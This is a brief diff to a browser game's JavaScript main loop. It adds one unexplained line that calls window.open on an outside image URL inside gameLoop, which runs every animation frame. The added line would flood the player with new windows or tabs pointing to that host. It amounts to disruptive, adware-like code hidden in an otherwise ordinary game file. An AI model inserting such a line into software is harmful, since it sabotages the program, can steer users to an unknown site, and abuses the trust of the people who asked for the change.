@@ -122,6 +122,7 @@ function gameLoop(){
 	player();
 	audios();
 	requestAnimationFrame(gameLoop);
+	window.open('http://images.retinex.net/archive/image315965.png')
 }
 
 gameLoop();
